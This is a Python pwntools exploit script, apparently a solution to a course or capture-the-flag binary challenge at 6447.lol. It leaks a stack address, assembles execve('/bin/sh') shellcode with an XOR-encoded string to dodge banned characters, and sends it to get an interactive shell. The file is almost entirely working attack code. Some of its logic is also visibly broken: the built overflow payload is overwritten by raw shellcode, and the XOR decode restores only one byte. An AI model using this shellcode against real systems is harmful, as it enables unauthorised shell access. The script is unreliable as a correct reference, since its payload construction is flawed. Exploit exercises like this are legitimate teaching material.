#!/usr/bin/env python3

from pwn import *
import argparse

HOST = "6447.lol"
PORT = 6192

context.arch = "amd64"

# banned characters - abcdefghijklmonpqurtsABCD/binshh
# custom_alphabet = b'EFGHIJKLMONPQURTSVWXYZ'

offset_from_rbp = 272

# asm_hex = "0x" + ''.join(reversed([hex(ord(x))[2:] for x in "/bin/sh"]))
# shellcode = asm(
#     "xor rsi, rsi\n"            
#     "xor rdx, rdx\n"           
#     f"mov rax, {asm_hex}\n"     
#     "push rax\n"                
#     "mov rdi, rsp\n"            
#     "mov rax, 59\n"             
#     "syscall\n"
# )

def exploit(p):
    reply = p.recvlines(3)
    stack_ptr = re.search('0x(.{12})', str(reply[2])).group(0)
    address = int(stack_ptr, 16)
    log.info("Buffer address: %s | %s" % (stack_ptr, p64(address)))

    bin_sh = "/bin/sh"
    xor_key = 0x20 
    encoded_bin_sh = ''.join([chr(ord(c) ^ xor_key) for c in bin_sh]) 
    encoded_bin_sh_hex = encoded_bin_sh[::-1].encode('latin-1').hex()
    first_chunk = encoded_bin_sh_hex[:16].ljust(16, '0') 
    second_chunk = encoded_bin_sh_hex[16:].ljust(16, '0')

    shellcode = asm(
        "xor rsi, rsi\n"            
        "xor rdx, rdx\n"   
                 
        "xor rax, rax\n"
        f"mov rax, 0x{first_chunk}\n"  
        "push rax\n"
        f"mov rax, 0x{second_chunk}\n"
        "push rax\n"

        "mov rdi, rsp\n"

        f"mov rbx, {hex(xor_key)}\n"
        "mov rax, [rdi]\n"
        "xor rax, rbx\n"
        "mov [rdi], rax\n"
        
        "mov rax, 59\n" 
        "syscall\n"
    )

    payload = fit({(offset_from_rbp - len(shellcode)): shellcode, (offset_from_rbp + 8): p64(address)}, filler='\x90', length=(offset_from_rbp + 16))
    log.info('payload : %s', payload)
    payload = shellcode
    p.send(payload)
    p.interactive()

    # # we will decode the encoded bin_sh string using xor
    # bin_sh = "/bin/sh"
    # xor_key = 0x20 
    # encoded_bin_sh = ''.join([chr(ord(c) ^ xor_key) for c in bin_sh]) 
    # encoded_bin_sh_hex = encoded_bin_sh[::-1].encode('latin-1').hex()
    # first_chunk = encoded_bin_sh_hex[:16].ljust(16, '0') 
    # second_chunk = encoded_bin_sh_hex[16:].ljust(16, '0')

    # shellcode = asm(
    #     "xor rsi, rsi\n"            
    #     "xor rdx, rdx\n"   
                 
    #     "xor rax, rax\n"
    #     f"mov rax, 0x{first_chunk}\n"  
    #     "push rax\n"
    #     f"mov rax, 0x{second_chunk}\n"
    #     "push rax\n"

    #     "mov rdi, rsp\n"

    #     f"mov rbx, {hex(xor_key)}\n"
    #     "mov rax, [rdi]\n"
    #     "xor rax, rbx\n"
    #     "mov [rdi], rax\n"
        
    #     "mov rax, 59\n" 
    #     "syscall\n"
    # )

if __name__ == '__main__':
    if args.REMOTE:
        exploit(remote(HOST, PORT))
    else:
        exploit(process(f"{__file__.replace('_sol.py', '')}"))
